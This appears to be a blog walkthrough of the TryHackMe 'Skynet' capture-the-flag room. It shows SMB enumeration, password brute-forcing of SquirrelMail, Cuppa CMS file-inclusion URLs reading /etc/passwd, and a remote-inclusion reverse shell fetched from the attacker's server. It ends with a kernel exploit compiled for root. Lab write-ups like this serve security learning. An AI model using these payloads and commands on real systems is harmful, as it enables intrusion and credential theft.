---
title: "Walk-through of Skynet from TryHackMe"
header:
  teaser: /assets/images/2021-02-17-22-06-45.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - Linpeas
  - SQLi
  - hashcrack
---

## Machine Information

![skynet](/assets/images/2021-02-17-22-06-45.png)

Skynet is rated as an easy difficulty room on TryHackMe. This Linux based server has a number of web applications installed which we find through enumeration. This leads us to a SAMBA share, where we find credentials which we use to log in to one of the previously found applications. From there we use a public known exploit to gain a foothold via a reverse shell. Once we are on the server we enumerate to find our escalation path to root.
<!--more-->

 Skills required are basic knowledge file and server enumeration to find our entry point. Skills learned are abusing remote file inclusion vulnerabilities, researching exploits and compiling one to gain root access via kernel vulnerabilities.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Skynet](https://tryhackme.com/room/skynet) |
| Machine Release Date | 18th September 2019 |
| Date I Completed It | 17th February 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
root@kali:/home/kali/thm/skynet# ports=$(nmap -p- --min-rate=1000 -T4 10.10.102.194 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:/home/kali/thm/skynet# nmap -p$ports -sC -sV -oA skynet 10.10.102.194
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-12 17:00 GMT
Nmap scan report for 10.10.102.194
Host is up (0.042s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP CAPA PIPELINING UIDL RESP-CODES AUTH-RESP-CODE SASL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ENABLE OK IDLE Pre-login capabilities more have listed post-login LOGINDISABLEDA0001 ID IMAP4rev1 LOGIN-REFERRALS SASL-IR LITERAL+
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-02-12T11:00:40-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-02-12T17:00:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
```

A few ports open, let's start with 80 using our browser:

![skynet-homepage](/assets/images/2021-02-12-17-10-48.png)

Just a basic web page that doesn't do anything. Let's try gobuster and see if there are any hidden subfolders:

```text
root@kali:/home/kali# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.102.194
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.102.194
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/12 17:12:39 Starting gobuster
===============================================================
http://10.10.102.194/admin (Status: 301)
http://10.10.102.194/css (Status: 301)
http://10.10.102.194/js (Status: 301)
http://10.10.102.194/config (Status: 301)
http://10.10.102.194/ai (Status: 301)
http://10.10.102.194/squirrelmail (Status: 301)
http://10.10.102.194/server-status (Status: 403)
===============================================================
2021/02/12 17:14:41 Finished
===============================================================
```

I tried them all, only SquirrelMail is accessible:

![skynet-squirrel](/assets/images/2021-02-12-17-16-33.png)

## Samba Enumeration

No obvious way in from port 80, we also found SMB shares on port 445, let's have a look at those:

```text
root@kali:/home/kali# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.102.194
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-12 17:08 GMT
Nmap scan report for 10.10.102.194
Host is up (0.039s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds
Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.102.194\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.102.194\anonymous:
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.102.194\milesdyson:
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.102.194\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-users:
|   SKYNET\milesdyson (RID: 1000)
|     Full name:
|     Description:
|_    Flags:       Normal user account
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

Nmap reveals a share called anonymous that we can access, we could also use SMBMap to check:

```text
root@kali:/home/kali# smbmap -H 10.10.102.194
[+] Guest session       IP: 10.10.102.194:445   Name: 10.10.102.194
        Disk                     Permissions     Comment
        ----                     -----------     -------
        print$                   NO ACCESS       Printer Drivers
        anonymous                READ ONLY       Skynet Anonymous Share
        milesdyson               NO ACCESS       Miles Dyson Personal Share
        IPC$                     NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

Let's have a look at the anonymous share with smbclient:

```text
root@kali:/home/kali# smbclient //10.10.102.194/anonymous
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019
```

Let's have a look at attention.txt:

```text
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \> !cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
smb: \>
```

Not very interesting, let's look in the logs folder:

```text
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019
```

## Password List

Only one file has a size of more than zero bytes, let's have a look at it:

```text
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (4.1 KiloBytes/sec) (average 2.4 KiloBytes/sec)
smb: \logs\> !cat log1.txt
<HIDDEN>
terminator22596
terminator219
terminator20
terminator168
terminator16
terminator143
<SNIP>
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

Looking at the information we've gathered so far. We found a share called milesdyson, and a note from him about an outage, suggesting that user has a level of importance. We've also just found a possible list of passwords. Let's go back to the SquirrelMail login and see if we can get lucky.

We could do this manually, but let's use Burp Intruder instead to automate it. Start Burp and enable intercept, then attempt to log in to SquirrelMail with admin:password:

![skytnet-squirrellogin](/assets/images/2021-02-15-22-46-23.png)

Send the captured request to Intruder, set the username to milesdydon, and configure password as the payload:

![skynet-burpintruder](/assets/images/2021-02-15-22-45-25.png)

Switch to Payloads section and load our list of possible passwords:

![skynet-passwords](/assets/images/2021-02-15-22-53-09.png)

Start attack, and we find the first password in the list was the correct one:

![skynet-burpfoundpassword](/assets/images/2021-02-15-22-52-24.png)

Using these credentials gets us in to milesdyson's mailbox:

![skynet-milesinbox](/assets/images/2021-02-15-22-56-33.png)

The first email sounds interesting from a user called skynet, and looking at it we find a password:

![skynet-sambapassword](/assets/images/2021-02-15-22-57-00.png)

```text
We have changed your smb password after system malfunction.
Password: <<HIDDEM>
```

We have Miles smb password, let's go try it:

```text
root@kali:/home/kali/thm/skynet# smbclient //10.10.102.194/milesdyson -U milesdyson
Enter WORKGROUP\milesdyson's password:
Try "help" to get a list of possible commands.
```

We are in, time for a look around:

```text
smb: \> ls
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019
  notes                               D        0  Tue Sep 17 10:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019
```

The pdf files are a distraction, I move in to the notes folder:

```text
smb: \> cd notes
smb: \notes\> ls
  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
  important.txt                       N      117  Tue Sep 17 10:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019
<<SNIP>>
```

## Hidden Folder

There's another long list of files to distract us, but amongst them I see a text file:

```text
smb: \notes\> more important.txt
getting file \notes\important.txt of size 117 as /tmp/smbmore.H13jLc (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Line 1 mentions CMS, could that random string be a hidden folder:

![skynet-hiddenfolder](/assets/images/2021-02-15-23-08-23.png)

We find a static page, nothing obvious, let's try gobuster on this subfolder:

```text
root@kali:/home/kali/thm/skynet# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.102.194/45kra24zxs28v3yd
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.102.194/45kra24zxs28v3yd
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/15 23:10:37 Starting gobuster
===============================================================
http://10.10.102.194/45kra24zxs28v3yd/administrator (Status: 301)
===============================================================
2021/02/15 23:11:57 Finished
===============================================================
```

We find another subfolder called administrator, going there we have a Cuppa CMS login:

![skynet-cuppa](/assets/images/2021-02-15-23-12-49.png)

## Cuppa CMS

I tried the same credentials that we used for Miles on SMB but they didn't work. With nothing else obvious to try I look to SearchSploit:

```text
root@kali:/home/kali/thm/skynet# searchsploit cuppa
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion   | php/webapps/25971.txt
------------------------------------------------------------------ ---------------------------------
```

We have a possible exploit, let's look at how it works:

```text
root@kali:/home/kali/thm/skynet# searchsploit -x php/webapps/25971.txt
  Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/25971
     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
File Type: ASCII text, with very long lines, with CRLF line terminators
```

In there we see:

```text
An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

Examples:
http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

From this we can see there is a vulnerability in this version of Cuppa CMS that allows us to do both local and remote file inclusion. Let's check this works by using the above example to read the passwd file:

```text
http://10.10.102.194/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

![skynet-passwd](/assets/images/2021-02-16-22-25-27.png)

## User Flag

That works, so we can try to get the user flag, assuming it's in the usual location of the users home directory:

```text
http://10.10.102.194/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
```

![skynet-userflag](/assets/images/2021-02-16-22-33-26.png)

This also works, but we need to get a reverse shell on to the server to be able to escalate our privileges to root. Let's try doing remote file inclusion and pull a reverse shell from our attacking machine across to the server, and then use that to connect back to us. Let's grab our favourite PenTestMonkey shell and put our IP and port in:

```text
root@kali:/home/kali/thm/skynet# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2021-02-16 22:37:14--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘php-reverse-shell.php’
php-reverse-shell.php                100%[============>]   5.36K  --.-KB/s    in 0s
2021-02-16 22:37:14 (103 MB/s) - ‘php-reverse-shell.php’ saved [5491/5491]

root@kali:/home/kali/thm/skynet# nano php-reverse-shell.php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.6.200';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

The only thing I changed in the file is the IP to be my current one on tun0. Now I start a webserver so I can get to the file from the skynet server:

```text
root@kali:/home/kali/thm/skynet# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now we can browse to the Cuppa URL again, this time including our reverse shell hosted on the webserver on my Kali machine:

```text
http://10.10.102.194/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.6.200:8000/php-reverse-shell.php
```

If we switch to a waiting Netcat session we see we are now connected:

```text
root@kali:/home/kali/thm/skynet# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.14.6.200] from (UNKNOWN) [10.10.102.194] 35842
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 16:47:11 up 27 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a proper shell:

```text
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

If we haven't already got the flag from the user.txt file we can get that now by going to /home/milesdyson.

Next step is to find our way to the root flag. For CTFs there are a few things to always check, as these are often your way forward. There are lots of great cheatsheets out there to help, [this](https://github.com/Shiva108/CTF-notes/blob/master/Notes%20VA/Local%20Linux%20Enumeration%20n%20Privilege%20Escalation%20Cheatsheet%20.txt) is one that's proved useful. In most circumstances it's quicker to use something like [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) which does all the hard work for you:

```text
www-data@skynet:/tmp$ wget http://10.14.6.200:8000/linpeas.sh
wget http://10.14.6.200:8000/linpeas.sh
--2021-02-16 17:02:28--  http://10.14.6.200:8000/linpeas.sh
Connecting to 10.14.6.200:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 320037 (313K) [text/x-sh]
Saving to: 'linpeas.sh'
linpeas.sh        100%[===================>] 312.54K  1.48MB/s    in 0.2s
2021-02-16 17:02:28 (1.48 MB/s) - 'linpeas.sh' saved [320037/320037]

www-data@skynet:/tmp$ bash linpeas.sh
```

The first line gives us a possible path, the kernel version is 4.8.0-58, which linPEAS colours in red to indicate this is something to look at:

```text
==========================( Basic information )=============================
OS: Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
```

## Privilege Escalation

Let's try SearchSploit first:

```text
kali@kali:~$ searchsploit kernel 4.8.0-58
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free  | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation            | linux/local/41886.c
<SNIP>
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                        | linux/dos/44579.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)   | linux/local/43418.c
---------------------------------------------------------------------- ---------------------------------
```

There is an exploit listed that matches our kernel exactly:

```text
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP) | linux/local/43418.c
```

Let's grab the file and have a look:

```text
root@kali:/home/kali/thm/skynet# searchsploit -m linux/local/43418.c
  Exploit: Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)
      URL: https://www.exploit-db.com/exploits/43418
     Path: /usr/share/exploitdb/exploits/linux/local/43418.c
File Type: C source, ASCII text, with CRLF line terminators
Copied to: /home/kali/thm/skynet/43418.c

root@kali:/home/kali/thm/skynet# cat 43418.c
// A proof-of-concept local root exploit for CVE-2017-1000112.
// Includes KASLR and SMEP bypasses. No SMAP bypass.
// Tested on Ubuntu trusty 4.4.0-* and Ubuntu xenial 4-8-0-* kernels.
//
// EDB Note: Also included the work from ~ https://ricklarabee.blogspot.co.uk/2017/12/adapting-poc-for-cve-2017-1000112-to.html
//           Supports: Ubuntu Xenial (16.04) 4.4.0-81
//
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
// user@ubuntu:~$ whoami
// user
// user@ubuntu:~$ id
// uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn
<SNIP>
```

Simple to use, just get the file over to the server and compile it, then run to become root. Let's give it a go:

```text
www-data@skynet:/tmp$ wget http://10.14.6.200:8000/43418.c
wget http://10.14.6.200:8000/43418.c
--2021-02-16 17:17:41--  http://10.14.6.200:8000/43418.c
Connecting to 10.14.6.200:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24033 (23K) [text/plain]
Saving to: '43418.c'
43418.c             100%[===================>]  23.47K  --.-KB/s    in 0.03s
2021-02-16 17:17:41 (676 KB/s) - '43418.c' saved [24033/24033]
```

Exploit brought over to server, check who we are currently:

```text
www-data@skynet:/tmp$ whoami
whoami
www-data
www-data@skynet:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Compile and run the exploit:

```text
www-data@skynet:/tmp$ gcc 43418.c -o pwn
gcc 43418.c -o pwn
www-data@skynet:/tmp$ ./pwn
./pwn
[.] starting
[.] checking distro and kernel versions
[.] kernel version '4.8.0-58-generic' detected
[~] done, versions looks good
[.] checking SMEP and SMAP
[~] done, looks good
[.] setting up namespace sandbox
[~] done, namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[~] done, kernel text:   ffffffffab600000
[.] commit_creds:        ffffffffab6a5d20
[.] prepare_kernel_cred: ffffffffab6a6110
[.] SMEP bypass enabled, mmapping fake stack
[~] done, fake stack mmapped
[.] executing payload ffffffffab617c55
[~] done, should be root now
[.] checking if we got root
[+] got r00t ^_^
```

It worked, confirm we are now root:

```text
root@skynet:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@skynet:/tmp# whoami
whoami
root
```

We've made it to root, so we can get the final flag:

```text
root@skynet:/tmp# cat /root/root.txt
cat /root/root.txt
<<HIDDEN>>
```

All done. See you next time.
